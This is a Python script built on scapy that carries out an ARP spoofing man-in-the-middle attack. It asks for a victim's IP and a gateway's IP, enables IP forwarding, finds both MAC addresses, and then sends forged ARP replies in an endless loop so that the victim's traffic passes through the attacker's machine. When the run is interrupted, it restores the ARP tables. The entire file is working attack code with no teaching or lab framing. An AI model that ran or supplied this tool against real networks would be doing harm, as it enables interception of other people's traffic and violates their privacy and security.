
import os
from scapy.all import *

class ARP_SPOOF:
    victim_ip = ""
    victim_mac = ""
    gateway_mac = ""
    gateway_ip = ""

    def __init__(self, victim_ip, gateway_ip):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip

    def enableRouting(self):
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    def calcmacaddr(self):
        victpkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=self.victim_ip)
        ans, unans = srp(victpkt, timeout=2, verbose=False)
        victmac = ans[0][1].hwsrc
        self.victim_mac = victmac

        routerpkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=self.gateway_ip)
        ans, unans = srp(routerpkt, timeout=2, verbose=False)
        gatemac = ans[0][1].hwsrc
        self.gateway_mac = gatemac

    def spoofing(self, destip, destmac, srcip):
        spoofpkt = ARP(op=2, pdst=destip, hwdst=destmac, psrc=srcip)
        send(spoofpkt)

    def stopattack(self):
        pkt1 = ARP(op=2, hwsrc=self.victim_mac, psrc=self.victim_ip, hwdst=self.gateway_mac, pdst=self.gateway_ip)
        send(pkt1, verbose=False)
        pkt2 = ARP(op=2, hwsrc=self.gateway_mac, psrc=self.gateway_ip, hwdst=self.victim_mac, pdst=self.victim_ip)
        send(pkt2, verbose=False)

        print("ARP TABLE IS SUCCESSFULLY RESTORED")



def Attack():
    print("----------ARP SPOOFING ATTACK----------")
    victimip = input("Enter the Victim's IP Address: ")
    gatewayip = input("Enter the Gateway's IP Address: ")
    arp = ARP_SPOOF(victimip, gatewayip)
    arp.enableRouting()
    try:
        arp.calcmacaddr()
        print("MAC Address of Victim: ", arp.victim_mac)
        print("MAC Address of Gateway: ", arp.gateway_mac)


    except Exception as exception:
        print("Exception message: {}".format(exception))

    try:
        print("Attack Started")
        while True:
            arp.spoofing(arp.victim_ip,arp.victim_mac,arp.gateway_ip)
            arp.spoofing(arp.gateway_ip,arp.gateway_mac,arp.victim_ip)
       

    except KeyboardInterrupt:
        print("--------ENDING SPOOFING ATTACK--------")
        arp.stopattack()
        exit()



Attack()